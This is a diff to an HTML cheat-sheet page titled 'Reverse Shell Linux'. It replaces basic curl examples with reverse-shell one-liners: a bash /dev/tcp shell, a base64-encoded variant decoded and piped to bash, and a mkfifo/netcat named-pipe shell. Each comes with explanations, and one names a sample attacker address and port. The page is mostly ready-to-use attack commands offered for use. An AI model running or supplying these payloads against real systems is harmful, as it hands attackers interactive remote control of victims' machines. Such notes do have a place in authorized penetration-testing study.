@@ -9,32 +9,40 @@
    
 </head>
 <body>
-    <h1>c<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Reverse Shell</title>
-    <link rel="stylesheet" href="styles.css">
-    <link rel="stylesheet" href="note.css">
-   
-</head>
-<body>
     <h1>Reverse Shell Linux</h1>
-    <ul>
-        <li><code>$ curl https://example.com
-        </code> <br><br>> retrieve the HTML content of the specified URL <br><br></li>
-    </ul>
-    <ul>
-        <li><code>$ curl -X GET https://api.example.com/resource
-        </code> <br><br>> send a GET request <br><br></li>
-    </ul>
-    <ul>
-        <li><code>$ curl -X POST -d "key1=value1&key2=value2" https://api.example.com/resource
-        </code> <br><br>> send a POST request with data <br><br></li>
-    </ul>
-    <button onclick="goBack()">Back</button>
 
+    <ul>
+        <li><code>$ bash -c 'bash -i >& /dev/tcp/IP/Port 0>&1'
+            </code> <br><br>
+            > bash -c: allows to execute a single command or a string of commands provided as an argument.
+            > bash -i: Starts an interactive shell. <br>
+            > '>&': redirects stdout and stderr to the TCP connection <br>
+            > '0>&1': input from the attacker's machine is sent to the interactive shell.
+            <br><br></li>
+    </ul>
+    <ul>
+        <li><code>$ echo -n bash -c 'bash -i >& /dev/tcp/IPaddr/Port 0>&1' | base64 
+        </code> <br><br>> convert reverse-shell to base64 <br><br></li>
+    </ul>
+    <ul>
+        <li><code>$ echo -n bas64Payload | base64 -d | bash
+        </code> <br><br>> it will execute the reverse-shell  <br><br></li>
+    </ul>
+    <ul>
+        <li><code>$ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IPaddr Port > /tmp/f
+            </code> <br><br>
+            > reverse shell payload using a named pipe (FIFO) <br>
+            > 'rm /tmp/f': Deletes any existing file or named pipe at /tmp/f to prevent conflicts. <br>
+            > 'mkfifo /tmp/f': Creates a special file (/tmp/f) that acts as a communication channel. <br>
+            > 'cat /tmp/f': Reads commands sent through the pipe. <br>
+            > '| /bin/sh -i': The output of cat /tmp/f (data from the pipe) is piped (|) into an interactive shell (/bin/sh -i). <br>
+            > '2>&1': Combines stdout & stderr to ensure both are sent through the connection. <br>
+            > '| nc 10.10.14.28 4444': Sends the shell’s output to the attacker's machine using Netcat. <br>
+            > '> /tmp/f': Writes incoming commands from the attacker back into the pipe for execution by the shell.
+            <br><br></li>
+    </ul>
+
+    <button onclick="goBack()">Back</button>
     <script src="note.js"></script>
 </body>
 </html>
